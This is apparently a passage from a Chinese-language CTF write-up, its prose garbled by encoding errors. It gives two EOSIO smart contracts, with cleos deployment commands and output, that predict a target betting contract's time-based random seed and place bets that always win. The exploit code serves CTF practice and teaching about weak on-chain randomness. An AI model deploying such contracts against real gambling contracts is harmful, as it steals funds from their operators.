          i32.const 0
          i32.const 8352
          call $env.eosio_assert
        end
        get_local $l1
        get_local $l2
        get_local $l3
        get_local $l0
        call $f81                            ;; 
    #include 
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
      private:
        int random(int oldseed, const int range){
          // Generate new seed value using the existing seed value
          int prime = 65537;
          auto new_seed_value = (oldseed + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
          // Get the random result in desired range
          int random_result = new_seed_value % range;
          return random_result;
        }
      public:
        using contract::contract;
        attack( name receiver, name code, datastream ds ):contract(receiver, code, ds){}
        [[eosio::action]]
        void makebet(int oldseed)
        {
          // Ensure this action is authorized by the player
          require_auth(get_self());
          int random_num = random(oldseed, 5);
          print("make bet ", random_num);
          action(
            permission_level{get_self(),"active"_n},  //æ‰€éœ€è¦çš„æƒé™ç»“æ„
            name(TARGET_ACCOUNT),                          // è°ƒç”¨çš„åˆçº¦åç§°
            "bet"_n,                              // åˆçº¦çš„æ–¹æ³•
            std::make_tuple(get_self(), random_num) // ä¼ é€’çš„å‚æ•°
          ).send();
        }
    };
ç¼–è¯‘åˆçº¦ã€æŠµæŠ¼ RAMã€éƒ¨ç½²åˆçº¦ã€è°ƒæ•´åˆçº¦ eosio.code
æƒé™ç­‰è¿‡ç¨‹é™äºç¯‡å¹…è¿™é‡Œçœç•¥ï¼Œå»ºè®®å¤§å®¶åœ¨å®˜ç½‘ä¸Šå­¦ä¹ å¹¶è‡ªè¡Œgoogleï¼Œæˆ‘è¿™é‡Œå°±ç®€å•ç»™å‘½ä»¤ä»‹ç»äº†
    # ç¼–è¯‘ attack.cpp è·å¾— attack.wasm ä»¥åŠ attack.abi
    eosio-cpp attack.cpp 
    # æŠµæŠ¼ RAM
    cleos -u http://jungle2.cryptolions.io:80 system buyram aaatester123 aaatester123 "10.0000 EOS" 
    # éƒ¨ç½²åˆçº¦ï¼Œè¿™é‡Œä½¿ç”¨ -u æŒ‡å®šä¸€ä¸ªå…¨èŠ‚ç‚¹å°±ä¸éœ€è¦è‡ªå·±è·‘é“¾äº†
    cleos -u http://jungle2.cryptolions.io:80 set contract aaatester123 ./attack
    # è°ƒæ•´ eosio.code æƒé™
    cleos -u http://jungle2.cryptolions.io:80 set account permission aaatester123 active  
    '{"threshold" : 1, "keys" : [{"key":"ä½ é€‰çš„EOSå…¬é’¥","weight":1}], 
    "accounts" : [{"permission":{"actor":"aaatester123","permission":"eosio.code"},"weight":1}]}' owner  
    -p aaatester123@owner
å¦‚æœä½ ä»¥åŠé€šè¿‡äº†å®˜ç½‘ä¸Šçš„åˆæ­¥æµ‹è¯•ï¼Œåˆ™åº”è¯¥å·²ç»äº†è§£äº† EOS åˆçº¦ä¸‹çš„ç»“æ„ï¼Œè¿™é‡Œæˆ‘é‡å¤ä»‹ç»ä»¥ä¸‹
    #include    // æ ¸å¿ƒåº“å‡½æ•°
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
    public:
        [[eosio::action]]
        {...}
    }
è¿™é‡Œåœ¨ public å…³é”®å­—ä¸‹ç”± [[eosio::action]] ä½œä¸ºæ ‡è®°çš„å‡½æ•°å°±æ˜¯å¯¹å¤–æš´éœ²å¯è°ƒç”¨çš„å‡½æ•°ï¼Œç±»ä¼¼äºä»¥å¤ªåŠä¸‹çš„ public
functionï¼›æˆ‘ä»¬çœ‹è¿™ä¸ªæ”»å‡»åˆçº¦å†…æœ‰å”¯ä¸€çš„å¯è°ƒç”¨å‡½æ•° makebetï¼Œå…¶æ¥æ”¶ä¸€ä¸ª int ç±»å‹çš„å‚æ•°ï¼Œå³ç›®æ ‡åˆçº¦ç°æœ‰çš„ seed
å€¼ï¼Œæˆ‘ä»¬ä¸€æ ·å¯ä»¥åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸Šæ‰¾åˆ°è¯¥å€¼
å‡½æ•°çš„åŠŸèƒ½è¿˜æ˜¯å¾ˆæ˜¾è€Œæ˜“è§çš„ï¼Œå°±æ˜¯åŸºäºä¼ å…¥çš„ oldseed è®¡ç®—æ–°çš„ seed å¹¶å‘ç›®æ ‡åˆçº¦å‘äº¤æ˜“ï¼Œç¨å¾®è¦å•°å—¦çš„å°±æ˜¯ EOS ä¸­åˆçº¦å‘é€ inline
äº¤æ˜“çš„ä»£ç è¦å†™æˆè¿™æ ·ï¼Œç›¸æ¯” ä»¥å¤ªåŠ ä¸­çš„ send å’Œ call è¿˜æ˜¯éº»çƒ¦äº†å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒå®˜ç½‘éƒ¨åˆ†
    action(
            //permission_level,
            //code,
            //action,
            //data
          ).send();
å…¶ä¸­å‚æ•°å•¥çš„è¿˜æ˜¯è‡ªå·±å–æœæ¸…æ¥šæŠŠï¼›æ¥ä¸‹æ¥æˆ‘ä»¬è°ƒç”¨éƒ¨ç½²çš„åˆçº¦ï¼›
    # å·²çŸ¥ç°åœ¨çš„ seed value ä¸º 45587ï¼Œé‚£ä¹ˆä¼ å…¥å‚æ•°ä¸º 45587
    cleos -u http://jungle2.cryptolions.io:80 push action aaatester123 makebet '{"oldseed":45587}' -p aaatester123@active
    # è¿”å›
    # executed transaction: f672ad16a8f40d9f96a56b2eaabd4b719e2ae4c66aed0a9bf5bae8e9fc481219  96 bytes  206 us
    #  aaatester123 > make bet 0
    #  de1ctftest11 
    #include 
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
      private:
        struct [[eosio::table]] seed {
          uint64_t        key = 1;
          uint32_t        value = 1;
          auto primary_key() const { return key; }
        };
        typedef eosio::multi_index seed_table;
        seed_table _seed;
        int random(const int range){
          // Find the existing seed
          auto seed_iterator = _seed.begin();
          // Initialize the seed with default value if it is not found
          if (seed_iterator == _seed.end()) {
            seed_iterator = _seed.emplace( _self, [&]( auto& seed ) { });
          }
          // Generate new seed value using the existing seed value
          int prime = 65537;
          auto new_seed_value = (seed_iterator->value + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
          // Get the random result in desired range
          int random_result = new_seed_value % range;
          return random_result;
        }
      public:
        using contract::contract;
        attack( name receiver, name code, datastream ds ):contract(receiver, code, ds),
                           _seed(eosio::name(TARGET_ACCOUNT), eosio::name(TARGET_ACCOUNT).value) {}
        [[eosio::action]]
        void makebet()
        {
          // Ensure this action is authorized by the player
          require_auth(get_self());
          int random_num = random(5);
          print("make bet ", random_num);
          action(
            permission_level{get_self(),"active"_n},  //æ‰€éœ€è¦çš„æƒé™ç»“æ„
            name(TARGET_ACCOUNT),                          // è°ƒç”¨çš„åˆçº¦åç§°
            "bet"_n,                              // åˆçº¦çš„æ–¹æ³•
            std::make_tuple(get_self(), random_num) // ä¼ é€’çš„å‚æ•°
          ).send();
        }
    };
è¯¥åˆçº¦æœ€å¤§çš„ä¸åŒæ˜¯å¼•å…¥äº† multi_index è¡¨ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç›´æ¥åœ¨è¿è¡Œæ—¶æŸ¥è¯¢ seed
çš„valueè€Œä¸ç”¨æˆ‘ä»¬äººå·¥å»æŸ¥äº†ï¼Œè™½ç„¶æ˜¾å¾—å¤æ‚ä¸€äº›ï¼Œä½†å…¶åŸç†è¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼Œtableç­‰ç›¸å…³çŸ¥è¯†ä¹Ÿåœ¨å®˜ç½‘ä¸­æœ‰è¯¦ç»†ä»‹ç»ï¼Œç±»ä¼¼äºä»¥å¤ªåŠä¸­çš„ map ç»“æ„ã€‚
å¦å¤–ä¸€ç§åŸºäºå›æ»šæ”»å‡»çš„æ–¹æ³•æˆ‘ä»¬æ”¾åˆ°å¦æ–‡ä»‹ç»ï¼Œæ„Ÿè°¢é˜…è¯»ğŸ˜„